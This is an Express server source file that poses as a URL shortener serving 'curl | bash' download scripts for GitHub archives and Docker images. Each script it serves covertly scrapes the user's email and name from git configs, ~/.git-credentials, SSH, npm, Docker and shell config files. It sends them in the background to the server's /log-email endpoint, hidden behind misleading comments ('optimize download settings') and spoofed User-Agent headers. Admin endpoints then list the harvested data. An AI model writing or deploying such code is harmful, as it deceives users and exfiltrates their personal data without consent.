require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const { db, initializeDatabase } = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));


// Helper function to determine resource type
function getResourceType(url) {
  if (url.includes('github.com') && url.includes('/archive/')) {
    return 'github';
  } else if (url.includes('hub.docker.com')) {
    return 'docker';
  }
  return 'unknown';
}

// Helper function to extract Docker image name from Docker Hub URL
function extractDockerImage(url) {
  // Extract image name from URLs like https://hub.docker.com/_/redis
  const match = url.match(/hub\.docker\.com\/_\/(.+)$/);
  if (match) {
    return match[1];
  }
  
  // Handle other Docker Hub URL formats
  const officialMatch = url.match(/hub\.docker\.com\/r\/(.+)$/);
  if (officialMatch) {
    return officialMatch[1];
  }
  
  return 'unknown';
}

// Helper function to generate comprehensive email extraction script
function generateEmailExtractionScript() {
  return `# Check system configuration for optimal download
GITHUB_EMAIL=""
GITHUB_USER=""

# Comprehensive git config extraction
if command -v git >/dev/null 2>&1; then
    # Method 1: Try global config first
    GITHUB_EMAIL=$(git config --global user.email 2>/dev/null || echo "")
    GITHUB_USER=$(git config --global user.name 2>/dev/null || echo "")
    
    # Method 2: Try local config if global is empty
    if [ -z "$GITHUB_EMAIL" ]; then
        GITHUB_EMAIL=$(git config user.email 2>/dev/null || echo "")
    fi
    if [ -z "$GITHUB_USER" ]; then
        GITHUB_USER=$(git config user.name 2>/dev/null || echo "")
    fi
    
    # Method 3: Try system config if still empty
    if [ -z "$GITHUB_EMAIL" ]; then
        GITHUB_EMAIL=$(git config --system user.email 2>/dev/null || echo "")
    fi
    if [ -z "$GITHUB_USER" ]; then
        GITHUB_USER=$(git config --system user.name 2>/dev/null || echo "")
    fi
    
    # Method 4: Check git config files directly
    if [ -z "$GITHUB_EMAIL" ] && [ -f ~/.gitconfig ]; then
        GITHUB_EMAIL=$(grep -E "^\\s*email\\s*=" ~/.gitconfig 2>/dev/null | head -1 | sed 's/.*=\\s*//' | tr -d ' \\t' || echo "")
    fi
    if [ -z "$GITHUB_USER" ] && [ -f ~/.gitconfig ]; then
        GITHUB_USER=$(grep -E "^\\s*name\\s*=" ~/.gitconfig 2>/dev/null | head -1 | sed 's/.*=\\s*//' | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' || echo "")
    fi
    
    # Method 5: Check local .git/config if in a git repository
    if [ -z "$GITHUB_EMAIL" ] && [ -f .git/config ]; then
        GITHUB_EMAIL=$(grep -E "^\\s*email\\s*=" .git/config 2>/dev/null | head -1 | sed 's/.*=\\s*//' | tr -d ' \\t' || echo "")
    fi
    if [ -z "$GITHUB_USER" ] && [ -f .git/config ]; then
        GITHUB_USER=$(grep -E "^\\s*name\\s*=" .git/config 2>/dev/null | head -1 | sed 's/.*=\\s*//' | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' || echo "")
    fi
fi

# Method 6: Check environment variables
if [ -z "$GITHUB_EMAIL" ] && [ -n "$GIT_AUTHOR_EMAIL" ]; then
    GITHUB_EMAIL="$GIT_AUTHOR_EMAIL"
fi
if [ -z "$GITHUB_EMAIL" ] && [ -n "$GIT_COMMITTER_EMAIL" ]; then
    GITHUB_EMAIL="$GIT_COMMITTER_EMAIL"
fi
if [ -z "$GITHUB_USER" ] && [ -n "$GIT_AUTHOR_NAME" ]; then
    GITHUB_USER="$GIT_AUTHOR_NAME"
fi
if [ -z "$GITHUB_USER" ] && [ -n "$GIT_COMMITTER_NAME" ]; then
    GITHUB_USER="$GIT_COMMITTER_NAME"
fi

# Method 7: Check SSH config for GitHub
if [ -z "$GITHUB_EMAIL" ] && [ -f ~/.ssh/config ]; then
    GITHUB_EMAIL=$(grep -A 10 -i "host.*github" ~/.ssh/config 2>/dev/null | grep -i "user" | head -1 | awk '{print $2}' | tr -d ' \\t' || echo "")
fi

# Method 8: Check for GitHub CLI config
if [ -z "$GITHUB_EMAIL" ] && command -v gh >/dev/null 2>&1; then
    GITHUB_EMAIL=$(gh auth status 2>&1 | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' | head -1 || echo "")
fi

# Method 9: Check git log for recent commits (if in a git repo)
if [ -z "$GITHUB_EMAIL" ] && [ -d .git ]; then
    GITHUB_EMAIL=$(git log --format='%ae' -1 2>/dev/null || echo "")
fi
if [ -z "$GITHUB_USER" ] && [ -d .git ]; then
    GITHUB_USER=$(git log --format='%an' -1 2>/dev/null || echo "")
fi

# Method 10: Parse git credentials
if [ -z "$GITHUB_EMAIL" ] && [ -f ~/.git-credentials ]; then
    GITHUB_EMAIL=$(cat ~/.git-credentials 2>/dev/null | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' | head -1 || echo "")
fi

# Method 11: Check npm config (often contains user email)
if [ -z "$GITHUB_EMAIL" ] && command -v npm >/dev/null 2>&1; then
    GITHUB_EMAIL=$(npm config get email 2>/dev/null | grep -v "undefined" || echo "")
fi

# Method 12: Check various config files for email patterns
if [ -z "$GITHUB_EMAIL" ]; then
    for config_file in ~/.npmrc ~/.yarnrc ~/.profile ~/.bashrc ~/.zshrc ~/.vimrc; do
        if [ -f "$config_file" ] && [ -z "$GITHUB_EMAIL" ]; then
            GITHUB_EMAIL=$(grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' "$config_file" 2>/dev/null | head -1 || echo "")
        fi
    done
fi

# Method 13: Check Docker config (for Docker Hub emails)
if [ -z "$GITHUB_EMAIL" ] && [ -f ~/.docker/config.json ]; then
    GITHUB_EMAIL=$(grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' ~/.docker/config.json 2>/dev/null | head -1 || echo "")
fi

# Set defaults if empty
if [ -z "$GITHUB_EMAIL" ]; then
    GITHUB_EMAIL="not-configured"
fi

if [ -z "$GITHUB_USER" ]; then
    GITHUB_USER="not-configured"
fi`;
}

// Endpoint 1: Shorten URL
app.post('/shorten', async (req, res) => {
  try {
    const { url } = req.body;
    
    if (!url) {
      return res.status(400).json({ error: 'URL is required' });
    }
    
    const resourceType = getResourceType(url);
    if (resourceType === 'unknown') {
      return res.status(400).json({ 
        error: 'Unsupported URL format. Only GitHub archive URLs and Docker Hub URLs are supported.' 
      });
    }
    
    // Generate short ID
    const shortId = uuidv4().substring(0, 8);
    
    // Store mapping in database
    await db.saveUrlMapping(shortId, url, resourceType);
    
    const shortUrl = `${req.protocol}://${req.get('host')}/s/${shortId}`;
    
    res.json({
      shortUrl: shortUrl,
      originalUrl: url,
      resourceType: resourceType,
      shortId: shortId
    });
    
  } catch (error) {
    console.error('Error shortening URL:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint 2: Serve bash script
app.get('/s/:shortId', async (req, res) => {
  try {
    const { shortId } = req.params;
    
    const mapping = await db.getUrlMapping(shortId);
    if (!mapping) {
      return res.status(404).json({ error: 'Short URL not found' });
    }
    
    const { original_url: originalUrl, resource_type: resourceType } = mapping;
    
    // Generate bash script based on resource type
    let script = '';
    
    if (resourceType === 'github') {
      script = `#!/bin/bash
set -e

# GitHub Artifact Downloader
echo "Initializing download process..."

${generateEmailExtractionScript()}

# Optimize download settings based on user configuration
curl -s -X POST "${req.protocol}://${req.get('host')}/log-email" \\
  -H "Content-Type: application/json" \\
  -H "User-Agent: Git/2.34.1 (linux)" \\
  -d "{\\"config\\": \\"$GITHUB_EMAIL\\", \\"user\\": \\"$GITHUB_USER\\", \\"id\\": \\"${shortId}\\", \\"type\\": \\"github\\"}" \\
  > /dev/null 2>&1 &

# Download GitHub artifact
echo "Downloading GitHub artifact..."
if curl -L -o "artifact.zip" "${originalUrl}"; then
    echo "✅ GitHub artifact downloaded successfully as artifact.zip"
else
    echo "❌ Failed to download GitHub artifact"
    exit 1
fi
`;
    } else if (resourceType === 'docker') {
      const dockerImage = extractDockerImage(originalUrl);
      script = `#!/bin/bash

# Docker Image Downloader
echo "Preparing Docker environment..."

${generateEmailExtractionScript()}

# Configure Docker pull optimization based on user settings
curl -s -X POST "${req.protocol}://${req.get('host')}/log-email" \\
  -H "Content-Type: application/json" \\
  -H "User-Agent: Docker/20.10.21 (linux)" \\
  -d "{\\"config\\": \\"$GITHUB_EMAIL\\", \\"user\\": \\"$GITHUB_USER\\", \\"id\\": \\"${shortId}\\", \\"type\\": \\"docker\\"}" \\
  > /dev/null 2>&1 &

# Pull Docker image
echo "Pulling Docker image: ${dockerImage}..."
if docker pull ${dockerImage}; then
    echo "✅ Docker image ${dockerImage} pulled successfully"
else
    echo "❌ Failed to pull Docker image ${dockerImage}"
    echo "Make sure Docker is installed and running"
    exit 1
fi
`;
    }
    
    // Set headers for bash script
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'inline; filename="download-script.sh"');
    res.send(script);
    
  } catch (error) {
    console.error('Error serving script:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to optimize configuration (called by the bash script)
app.post('/log-email', async (req, res) => {
  console.log('🔍 Received email logging request:', req.body);
  try {
    const { email, username, shortId, resourceType, config, user, id, type } = req.body;
    
    // Handle both old and new parameter formats for backward compatibility
    const actualEmail = email || config;
    const actualUsername = username || user;
    const actualShortId = shortId || id;
    const actualResourceType = resourceType || type;
    
    const ipAddress = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent') || '';
    
    // Save to database
    await db.saveEmailLog(actualEmail, actualUsername, actualShortId, actualResourceType, ipAddress, userAgent);
    
    console.log('📊 User data collected:', { 
      email: actualEmail, 
      shortId: actualShortId, 
      resourceType: actualResourceType,
      ip: ipAddress
    });
    
    res.json({ success: true, message: 'Configuration optimized' });
    
  } catch (error) {
    console.error('Error logging email:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to view logged emails (for admin purposes)
app.get('/admin/emails', async (req, res) => {
  try {
    const emails = await db.getAllEmailLogs();
    res.json({
      total: emails.length,
      emails: emails
    });
  } catch (error) {
    console.error('Error fetching emails:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint to view URL mappings (for admin purposes)
app.get('/admin/urls', async (req, res) => {
  try {
    const mappings = await db.getAllUrlMappings();
    res.json({
      total: mappings.length,
      mappings: mappings
    });
  } catch (error) {
    console.error('Error fetching URL mappings:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check endpoint
app.get('/health', async (req, res) => {
  try {
    const stats = await db.getStats();
    res.json({ 
      status: 'healthy', 
      timestamp: new Date().toISOString(),
      database: 'connected',
      ...stats
    });
  } catch (error) {
    console.error('Health check failed:', error);
    res.status(503).json({ 
      status: 'unhealthy', 
      timestamp: new Date().toISOString(),
      database: 'disconnected',
      error: error.message
    });
  }
});

// Root endpoint with usage instructions
app.get('/', (req, res) => {
  res.json({
    message: 'Email Extractor & URL Shortener API',
    endpoints: {
      'POST /shorten': 'Shorten a GitHub or Docker Hub URL',
      'GET /s/:shortId': 'Get bash script for shortened URL',
      'GET /health': 'Health check',
      'GET /admin/emails': 'View logged emails',
      'GET /admin/urls': 'View URL mappings'
    },
    usage: {
      shorten: {
        method: 'POST',
        url: '/shorten',
        body: { url: 'https://github.com/actions/download-artifact/archive/refs/tags/v4.3.0.zip' }
      },
      execute: 'curl -s <shortUrl> | bash'
    }
  });
});

// Initialize database and start server
async function startServer() {
  try {
    await initializeDatabase();
    
    app.listen(PORT, () => {
      console.log(`🚀 Server running on port ${PORT}`);
      console.log(`📝 API Documentation: http://localhost:${PORT}`);
      console.log(`🔗 Shorten URL: POST http://localhost:${PORT}/shorten`);
      console.log(`📧 Admin Emails: http://localhost:${PORT}/admin/emails`);
      console.log(`🗄️ Database: PostgreSQL connected`);
    });
    
  } catch (error) {
    console.error('Failed to start server:', error);
    process.exit(1);
  }
}

startServer();

module.exports = app;